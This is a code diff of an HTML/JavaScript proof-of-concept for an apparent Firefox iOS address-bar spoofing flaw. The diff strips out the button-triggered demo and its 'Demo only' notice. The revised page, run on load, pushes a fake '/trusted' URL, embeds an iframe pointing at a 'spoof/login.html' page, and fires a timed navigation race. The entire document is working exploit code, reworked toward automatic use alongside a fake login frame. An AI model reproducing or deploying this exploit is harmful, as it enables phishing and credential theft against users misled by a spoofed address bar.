@@ -10,24 +10,6 @@ body {
   font-family: -apple-system, BlinkMacSystemFont, system-ui;
   background: #f5f5f7;
 }
-button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
 iframe {
   width: 100%;
   height: 220px;
@@ -39,61 +21,34 @@ iframe {
   margin-top: 14px;
   font-size: 13px;
   color: #b00020;
+  text-align: center;
 }
 </style>
 </head>
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
+<!-- iframe muncul otomatis -->
+<iframe
+  id="childFrame"
+  src="https://cnfdnfial-ops.github.io/spoof/login.html"
+  sandbox="allow-scripts allow-forms allow-same-origin">
+</iframe>
 
-<div id="panel">
-  <h2>Firefox iOS Navigation Race</h2>
-  <p>Click the button, observe address bar & iframe behavior.</p>
-
-  <button id="actionBtn">Trigger Action</button>
-  <p id="output">Status: idle</p>
-
-  <!-- iframe external -->
-  <iframe
-    id="childFrame"
-    src="https://cnfdnfial-ops.github.io/spoof/login.html"
-    sandbox="allow-scripts allow-forms allow-same-origin">
-  </iframe>
-
-  <div class="notice">
-    Demo only — Firefox iOS affected, Safari/Chrome iOS not affected.
-  </div>
+<div class="notice">
+  Firefox iOS only — observe address bar & navigation race
 </div>
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
+/* Step 1: URL manipulation, happens immediately */
+history.pushState({}, '', '/trusted');
 
-/* Dummy action */
-function triggerAction() {
-  output.textContent = "Action executed @ " + location.href;
-}
-
-/* Step 1: Show panel & manipulate URL */
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted'); // Omnibar change
-  panel.style.display = 'block';
-  output.textContent = "pushState → " + location.href;
-};
-
-/* Bind action button */
-document.getElementById('actionBtn').onclick = triggerAction;
-
-/* Step 2: Navigation race to show omnibar bug */
+/* Step 2: Navigation race, fires after page show */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com:9090'; // Race target
-      }, 80); // milliseconds
+        location.href = 'https://google.com:9090';
+      }, 80); // race timing
     });
   });
 });
